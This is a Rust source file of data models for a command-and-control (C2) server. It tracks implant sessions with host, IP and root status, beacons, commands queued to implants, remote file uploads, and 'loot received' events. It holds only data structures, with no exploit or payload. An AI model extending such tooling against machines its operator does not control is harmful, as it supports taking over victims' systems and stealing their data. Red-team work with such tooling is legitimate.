/// Shared data models for the C2 server.
use chrono::{DateTime, Utc};
use serde::{Deserialize, Serialize};

// ── Query params (GET /beacon) ───────────────────────────────────────

#[derive(Debug, Deserialize)]
pub struct BeaconQuery {
    pub id: Option<String>,
    pub ts: Option<String>,
    pub event: Option<String>,
}

// ── Implant Session ──────────────────────────────────────────────────

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ImplantSession {
    pub implant_id: String,
    pub hostname: String,
    pub ip: String,
    pub first_seen: DateTime<Utc>,
    pub last_seen: DateTime<Utc>,
    pub os: String,
    pub arch: String,
    pub uid: u32,
    pub privileges: String,
    pub tier: String,
    pub status: ImplantStatus,
    pub protocol_version: u32,
    pub beacon_count: u64,
    pub pending_commands: usize,
    pub total_commands: u64,
}

#[derive(Debug, Clone, Serialize, Deserialize, PartialEq)]
#[serde(rename_all = "lowercase")]
pub enum ImplantStatus {
    Active,
    Idle,
    Stale,
    Offline,
}

impl ImplantSession {
    pub fn new(implant_id: String, hostname: String, ip: String, tier: String, os: String, arch: String, uid: u32, protocol_version: u32) -> Self {
        let now = Utc::now();
        ImplantSession {
            implant_id,
            hostname,
            ip,
            first_seen: now,
            last_seen: now,
            os,
            arch,
            uid,
            privileges: if uid == 0 { "root".into() } else { "user".into() },
            tier,
            status: ImplantStatus::Active,
            protocol_version,
            beacon_count: 1,
            pending_commands: 0,
            total_commands: 0,
        }
    }

    pub fn update_seen(&mut self, ip: String) {
        self.last_seen = Utc::now();
        self.ip = ip;
        self.beacon_count += 1;
        self.update_status();
    }

    pub fn update_metadata(&mut self, os: Option<String>, arch: Option<String>, uid: Option<u32>, tier: Option<String>) {
        if let Some(o) = os { self.os = o; }
        if let Some(a) = arch { self.arch = a; }
        if let Some(u) = uid {
            self.uid = u;
            self.privileges = if u == 0 { "root".into() } else { "user".into() };
        }
        if let Some(t) = tier { self.tier = t; }
    }

    fn update_status(&mut self) {
        let elapsed = Utc::now() - self.last_seen;
        let mins = elapsed.num_minutes();
        self.status = if mins < 5 {
            ImplantStatus::Active
        } else if mins < 60 {
            ImplantStatus::Idle
        } else if mins < 1440 {
            ImplantStatus::Stale
        } else {
            ImplantStatus::Offline
        };
    }
}

// ── Commands ─────────────────────────────────────────────────────────

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct PendingCommand {
    pub id: String,
    pub module: String,
    pub action: String,
    pub args: serde_json::Value,
    pub timeout_secs: u32,
    pub created_at: DateTime<Utc>,
    pub delivered_at: Option<DateTime<Utc>>,
    pub status: CommandStatus,
}

#[derive(Debug, Clone, Serialize, Deserialize, PartialEq)]
#[serde(rename_all = "lowercase")]
pub enum CommandStatus {
    Pending,
    Sent,
    Completed,
    Failed,
}

impl PendingCommand {
    pub fn new(module: String, action: String, args: serde_json::Value, timeout_secs: u32) -> Self {
        PendingCommand {
            id: uuid::Uuid::new_v4().to_string(),
            module,
            action,
            args,
            timeout_secs,
            created_at: Utc::now(),
            delivered_at: None,
            status: CommandStatus::Pending,
        }
    }

    pub fn to_response_json(&self) -> serde_json::Value {
        serde_json::json!({
            "id": self.id,
            "module": self.module,
            "action": self.action,
            "args": self.args,
            "timeout_secs": self.timeout_secs,
        })
    }

    pub fn mark_sent(&mut self) {
        self.delivered_at = Some(Utc::now());
        self.status = CommandStatus::Sent;
    }
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct CommandRecord {
    pub id: String,
    pub module: String,
    pub action: String,
    pub args: serde_json::Value,
    pub created_at: DateTime<Utc>,
    pub delivered_at: Option<DateTime<Utc>>,
    pub completed_at: Option<DateTime<Utc>>,
    pub status: CommandStatus,
    pub result: Option<serde_json::Value>,
}

impl From<PendingCommand> for CommandRecord {
    fn from(cmd: PendingCommand) -> Self {
        CommandRecord {
            id: cmd.id,
            module: cmd.module,
            action: cmd.action,
            args: cmd.args,
            created_at: cmd.created_at,
            delivered_at: cmd.delivered_at,
            completed_at: None,
            status: cmd.status,
            result: None,
        }
    }
}

// ── Beacon Payload (from implant) ────────────────────────────────────

#[derive(Debug, Deserialize)]
pub struct BeaconPayload {
    pub implant_id: Option<String>,
    pub hostname: Option<String>,
    pub ts: Option<serde_json::Value>,
    pub tier: Option<String>,
    pub os: Option<String>,
    pub arch: Option<String>,
    pub uid: Option<u32>,
    pub protocol_version: Option<u32>,
    pub last_result: Option<CommandResultData>,
    // Legacy fields from old implants
    #[serde(rename = "host")]
    pub host_legacy: Option<String>,
    pub event: Option<String>,
}

#[derive(Debug, Clone, Deserialize)]
pub struct CommandResultData {
    pub command_id: Option<String>,
    pub status: Option<String>,
    pub data: Option<serde_json::Value>,
}

// ── Listener types ──────────────────────────────────────────────────

#[derive(Debug, Serialize, Deserialize)]
pub struct ListenerInfo {
    pub port: u16,
    pub protocol: String,
    pub active: bool,
}

#[derive(Debug, Deserialize)]
pub struct StartListenerRequest {
    pub port: u16,
    #[serde(default = "default_protocol")]
    pub protocol: String,
}

fn default_protocol() -> String { "http".into() }

// ── API types ────────────────────────────────────────────────────────

#[derive(Debug, Deserialize)]
pub struct QueueCommandRequest {
    pub module: String,
    pub action: String,
    #[serde(default)]
    pub args: serde_json::Value,
    #[serde(default = "default_timeout")]
    pub timeout_secs: u32,
}

fn default_timeout() -> u32 { 60 }

#[derive(Debug, Serialize)]
pub struct QueueCommandResponse {
    pub command_id: String,
    pub module: String,
    pub action: String,
    pub status: String,
}

#[derive(Debug, Serialize)]
pub struct SessionListResponse {
    pub sessions: Vec<ImplantSession>,
    pub count: usize,
}

#[derive(Debug, Serialize)]
pub struct SessionDetailResponse {
    pub session: ImplantSession,
    pub command_history: Vec<CommandRecord>,
}

#[derive(Debug, Deserialize)]
pub struct FileUploadRequest {
    pub remote_path: String,
    pub content_hex: String,
    #[serde(default)]
    pub mode: u32,
}

// ── C2 Events (WebSocket broadcast) ──────────────────────────────────

#[derive(Debug, Clone, Serialize)]
#[serde(tag = "type", content = "data")]
pub enum C2Event {
    NewSession {
        implant_id: String,
        hostname: String,
        ip: String,
        tier: String,
        uid: u32,
    },
    Beacon {
        implant_id: String,
        ts: i64,
    },
    CommandQueued {
        implant_id: String,
        command_id: String,
        module: String,
    },
    CommandSent {
        implant_id: String,
        command_id: String,
    },
    CommandResult {
        implant_id: String,
        command_id: String,
        status: String,
    },
    SessionOffline {
        implant_id: String,
    },
    LootReceived {
        implant_id: String,
        size: usize,
    },
}

impl C2Event {
    /// Serialize as a single-line JSON for WebSocket transmission.
    pub fn to_line(&self) -> String {
        let mut s = serde_json::to_string(self).unwrap_or_default();
        s.push('\n');
        s
    }
}
